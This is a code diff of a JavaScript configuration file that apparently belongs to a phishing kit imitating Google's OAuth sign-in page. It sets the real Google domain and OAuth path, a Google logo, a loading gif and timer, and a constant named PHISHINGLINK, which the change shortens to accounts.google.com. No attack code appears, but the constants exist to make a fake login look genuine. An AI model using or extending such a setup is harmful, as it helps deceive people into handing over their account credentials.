@@ -5,7 +5,7 @@ const DOMAINNAME = "https://accounts.google.com/";
 const DOMAINNAMEVERIFY = "accounts.google.com";
 const loadDOMAINPATH = "about:blank";
 const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
-const PHISHINGLINK = "https://accounts.google.com/v3/signin/identifier?dsh=S-1559317170%3A1682159813213089&continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dgoogle%2B%25C4%2591%25C4%2583ng%2Bnh%25E1%25BA%25ADp%26oq%3Dgoog%26aqs%3Dedge.0.69i59j69i57j69i60l2j69i65l3j69i60l2.1331j0j1%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAZAAQ&hl=vi&ifkv=AQMjQ7RoyII89UogZ6ZwCpSsCWXR9Yk1UkUfZLITs0d1RC_wgFCFW8VOP9EwvARoHRDqimNifHFl&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
+const PHISHINGLINK = "https://accounts.google.com/";
 const loadLOGO = "../loading.gif";
 const LOGO = "../google.svg";
 const loadTIME = 1000;
